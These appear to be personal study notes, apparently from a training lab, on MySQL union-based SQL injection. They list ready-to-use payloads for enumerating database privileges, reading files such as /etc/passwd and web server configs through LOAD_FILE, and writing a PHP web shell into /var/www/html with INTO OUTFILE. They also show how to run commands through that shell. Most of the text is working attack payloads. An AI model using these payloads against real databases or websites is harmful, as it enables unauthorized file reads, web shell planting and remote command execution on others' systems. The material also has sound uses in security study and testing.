#li Checking privileges

See [[2. SQL Cheatsheet]] for the commands within union injection

| **Privileges**                                                                                                                             |                                                      |     |
| ------------------------------------------------------------------------------------------------------------------------------------------ | ---------------------------------------------------- | --- |
| `cn' UNION SELECT 1, user(), 3, 4-- -`                                                                                                     | Find current user                                    |     |
| `cn' UNION SELECT 1, super_priv, 3, 4 FROM mysql.user WHERE user="root"-- -`                                                               | Find if user has admin privileges                    |     |
| `cn' UNION SELECT 1, grantee, privilege_type, is_grantable FROM information_schema.user_privileges WHERE grantee="'root'@'localhost'"-- -` | Find if all user privileges                          |     |
| `cn' UNION SELECT 1, variable_name, variable_value, 4 FROM information_schema.global_variables where variable_name="secure_file_priv"-- -` | Find which directories can be accessed through MySQL |     |
| **File Injection**                                                                                                                         |                                                      |     |
| `cn' UNION SELECT 1, LOAD_FILE("/etc/passwd"), 3, 4-- -`                                                                                   | Read local file                                      |     |
| `select 'file written successfully!' into outfile '/var/www/html/proof.txt'`                                                               | Write a string to a local file                       |     |
| `cn' union select "",'<?php system($_REQUEST[0]); ?>', "", "" into outfile '/var/www/html/shell.php'-- -`                                  | Write a web shell into the base web directory        |     |

Check for our current DB user
- `SELECT USER()`
- `SELECT CURRENT_USER()`
- `SELECT user from mysql.user`

Check if have super admin priviliges
- `SELECT super_priv FROM mysql.user`
- `SELECT grantee, privilege type from information_schema.user_privileges where grantee == "<our user name>"-- - `

# Read file 
- Assuming we have permission to do so, found above
	- `FILE
- `SELECT LOAD_FILE('/etc/passwd');
- Default Apache webroot is `/var/www/html`
	- Try reading `/var/www/html/search.php
`

# Write file
- Requirements
	- User with `FILE` privilege
		- See above (checking privileges)
	- MySQL global `secure_file_priv` variable not set
		- `SELECT VARIABLES LIKE 'secure_file_priv`;
		- If empty, we know we can read/write to any location
	- Write access to the location we want to write to
		- Need to find root path

## Methods of finding root path
- Use `load_file` to read server configuration, like 
	- Apache configuration: `/etc/apache2/apache2.conf`
	- Nginx configuration: `/etc/nginx/nginx.conf`
	- IIS configuration: `%WinDir%\System32\Inetsrv\Config\ApplicationHost.config`
- Fuzzing scan
	- Linux: `/seclists/Discovery/Web-Content/default-web-root-directory-linux.txt`
	- Windows: `/seclists/Discovery/Web-Content/default-web-root-direcotyr-windows.txt`
- Use server errors to find web directory


- Select into outfile
	- `select 'file written successfully!' into outfile '/var/www/html/proof.txt'`
- After writing webshell (see cheatsheet)
	- Navigate to it, `......./shell.php`
	- Then execute commands with `0` parameter
		- eg. `http://SERVER_IP:PORT/shell.php?0=id
		- Need to encode, URL encoding. 
			- eg. `" "` becomes ` + `
			- `/shell.php?cat+flag.txt`
		- Can input multiple commands with `;`
			- `ls; echo 'hi'`

NOTE 
- This is not an interactive shell per se, because it is stateless. Is more like a command runner
- Because each time, a **new** PHP process is run with input as `<?php system($_REQUEST[0]); ?>` where 0 is the command
- In contrast, a persistent shell runs different commands inside the single shell process.